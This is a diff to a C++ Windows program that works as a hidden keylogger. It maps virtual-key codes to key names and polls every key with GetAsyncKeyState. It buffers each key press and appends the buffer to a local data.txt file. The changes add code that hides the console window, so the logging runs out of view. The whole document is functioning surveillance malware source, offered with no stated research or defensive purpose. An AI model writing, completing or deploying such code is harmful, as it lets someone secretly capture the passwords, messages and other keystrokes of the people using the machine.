@@ -3,139 +3,148 @@
 #include <string>
 #include <fstream>
 #include <map>
+#include <vector>
 
 
 namespace keys{
 const std::map<int, std::string> key_codes {
-    {8, "vk_BackSpace"},
-    {9, "vk_Tab"},
-    {13, "vk_Return"},
-    {16, "vk_Shift"},
-    {17, "vk_Control"},
-    {18, "vk_Alt"},
-    {19, "vk_Pause"},
-    {20, "vk_CapsLock"},
-    {27, "vk_Escape"},
-    {32, "vk_Space"},
-    {33, "vk_PageUp"},
-    {34, "vk_PageDown"},
-    {35, "vk_End"},
-    {36, "vk_Home"},
-    {37, "vk_Left"},
-    {38, "vk_Up"},
-    {39, "vk_Right"},
-    {40, "vk_Down"},
-    {44, "vk_PrintScreen"},
-    {45, "vk_Insert"},
-    {46, "vk_Delete"},
-    {48, "vk_0"},
-    {49, "vk_1"},
-    {50, "vk_2"},
-    {51, "vk_3"},
-    {52, "vk_4"},
-    {53, "vk_5"},
-    {54, "vk_6"},
-    {55, "vk_7"},
-    {56, "vk_8"},
-    {57, "vk_9"},
-    {65, "vk_A"},
-    {66, "vk_B"},
-    {67, "vk_C"},
-    {68, "vk_D"},
-    {69, "vk_E"},
-    {70, "vk_F"},
-    {71, "vk_G"},
-    {72, "vk_H"},
-    {73, "vk_I"},
-    {74, "vk_J"},
-    {75, "vk_K"},
-    {76, "vk_L"},
-    {77, "vk_M"},
-    {78, "vk_N"},
-    {79, "vk_O"},
-    {80, "vk_P"},
-    {81, "vk_Q"},
-    {82, "vk_R"},
-    {83, "vk_S"},
-    {84, "vk_T"},
-    {85, "vk_U"},
-    {86, "vk_V"},
-    {87, "vk_W"},
-    {88, "vk_X"},
-    {89, "vk_Y"},
-    {90, "vk_Z"},
-    {91, "vk_LWin"},
-    {92, "vk_RWin"},
-    {93, "vk_Apps"},
-    {96, "vk_NumPad0"},
-    {97, "vk_NumPad1"},
-    {98, "vk_NumPad2"},
-    {99, "vk_NumPad3"},
-    {100, "vk_NumPad4"},
-    {101, "vk_NumPad5"},
-    {102, "vk_NumPad6"},
-    {103, "vk_NumPad7"},
-    {104, "vk_NumPad8"},
-    {105, "vk_NumPad9"},
-    {106, "vk_Multiply"},
-    {107, "vk_Add"},
-    {109, "vk_Subtract"},
-    {110, "vk_Decimal"},
-    {111, "vk_Divide"},
-    {112, "vk_F1"},
-    {113, "vk_F2"},
-    {114, "vk_F3"},
-    {115, "vk_F4"},
-    {116, "vk_F5"},
-    {117, "vk_F6"},
-    {118, "vk_F7"},
-    {119, "vk_F8"},
-    {120, "vk_F9"},
-    {121, "vk_F10"},
-    {122, "vk_F11"},
-    {123, "vk_F12"},
-    {124, "vk_F13"},
-    {125, "vk_F14"},
-    {126, "vk_F15"},
-    {127, "vk_F16"},
-    {144, "vk_NumLock"},
-    {145, "vk_ScrollLock"},
-    {160, "vk_LShift"},
-    {161, "vk_RShift"},
-    {162, "vk_LControl"},
-    {163, "vk_RControl"},
-    {164, "vk_LAlt"},
-    {165, "vk_RAlt"},
-    {186, "vk_SemiColon"},
-    {187, "vk_Equals"},
-    {188, "vk_Comma"},
-    {189, "vk_UnderScore"},
-    {190, "vk_Period"},
-    {191, "vk_Slash"},
-    {220, "vk_BackSlash"},
-    {221, "vk_RightBrace"},
-    {219, "vk_LeftBrace"},
-    {222, "vk_Apostrophe"}
+    {8, "BackSpace"},
+    {9, "Tab"},
+    {13, "Return"},
+    {16, "Shift"},
+    {17, "Control"},
+    {18, "Alt"},
+    {19, "Pause"},
+    {20, "CapsLock"},
+    {27, "Escape"},
+    {32, "Space"},
+    {33, "PageUp"},
+    {34, "PageDown"},
+    {35, "End"},
+    {36, "Home"},
+    {37, "Left"},
+    {38, "Up"},
+    {39, "Right"},
+    {40, "Down"},
+    {44, "PrintScreen"},
+    {45, "Insert"},
+    {46, "Delete"},
+    {48, "0"},
+    {49, "1"},
+    {50, "2"},
+    {51, "3"},
+    {52, "4"},
+    {53, "5"},
+    {54, "6"},
+    {55, "7"},
+    {56, "8"},
+    {57, "9"},
+    {65, "A"},
+    {66, "B"},
+    {67, "C"},
+    {68, "D"},
+    {69, "E"},
+    {70, "F"},
+    {71, "G"},
+    {72, "H"},
+    {73, "I"},
+    {74, "J"},
+    {75, "K"},
+    {76, "L"},
+    {77, "M"},
+    {78, "N"},
+    {79, "O"},
+    {80, "P"},
+    {81, "Q"},
+    {82, "R"},
+    {83, "S"},
+    {84, "T"},
+    {85, "U"},
+    {86, "V"},
+    {87, "W"},
+    {88, "X"},
+    {89, "Y"},
+    {90, "Z"},
+    {91, "LWin"},
+    {92, "RWin"},
+    {93, "Apps"},
+    {96, "NumPad0"},
+    {97, "NumPad1"},
+    {98, "NumPad2"},
+    {99, "NumPad3"},
+    {100, "NumPad4"},
+    {101, "NumPad5"},
+    {102, "NumPad6"},
+    {103, "NumPad7"},
+    {104, "NumPad8"},
+    {105, "NumPad9"},
+    {106, "Multiply"},
+    {107, "Add"},
+    {109, "Subtract"},
+    {110, "Decimal"},
+    {111, "Divide"},
+    {112, "F1"},
+    {113, "F2"},
+    {114, "F3"},
+    {115, "F4"},
+    {116, "F5"},
+    {117, "F6"},
+    {118, "F7"},
+    {119, "F8"},
+    {120, "F9"},
+    {121, "F10"},
+    {122, "F11"},
+    {123, "F12"},
+    {124, "F13"},
+    {125, "F14"},
+    {126, "F15"},
+    {127, "F16"},
+    {144, "NumLock"},
+    {145, "ScrollLock"},
+    {160, "LShift"},
+    {161, "RShift"},
+    {162, "LControl"},
+    {163, "RControl"},
+    {164, "LAlt"},
+    {165, "RAlt"},
+    {186, "SemiColon"},
+    {187, "Equals"},
+    {188, "Comma"},
+    {189, "UnderScore"},
+    {190, "Period"},
+    {191, "Slash"},
+    {220, "BackSlash"},
+    {221, "RightBrace"},
+    {219, "LeftBrace"},
+    {222, "Apostrophe"}
 };
 }
 
 
 
-void save_data(std::string data, std::string filePath){
+void save_data(std::vector<std::string>& data, const std::string& filePath){
     std::ofstream file(filePath, std::ios::app);
 
     if(file.is_open()){
-
+        
         //escribimos los datos en el txt
-        file << data << "\n";
+        for(const auto& entry : data){
+            if(entry == "Insert")
+                file << entry << "\n";
+            
+            file << entry;
+        }
         file.close();
+        data.clear();
     }
 }
 
 
 
 int main(){
-    bool key_pressed = false;
+    HWND hwnd = GetConsoleWindow();
+    ShowWindow(hwnd, SW_HIDE);
+    std::vector<std::string> buffer;
 
     while(true){ 
         for (int i = 0; i < 256; i++){
@@ -144,18 +153,17 @@ int main(){
             if(GetAsyncKeyState(i) & 0x8000){
                 auto it = keys::key_codes.find(i);
 
-                if(it != keys::key_codes.end() && !key_pressed){
-                    save_data(it->second, "data.txt");
-                    key_pressed = true;
+                if(it != keys::key_codes.end()){
+                    buffer.push_back(it->second);
+                    
+                    if(buffer.size() >= 100)
+                        save_data(buffer, "data.txt");
                 }
             }
-            
-            else{
-                key_pressed = false;
-            }
         }
-
+        Sleep(10);
     }
 
+    save_data(buffer, "data.txt");
     return 0;
 }
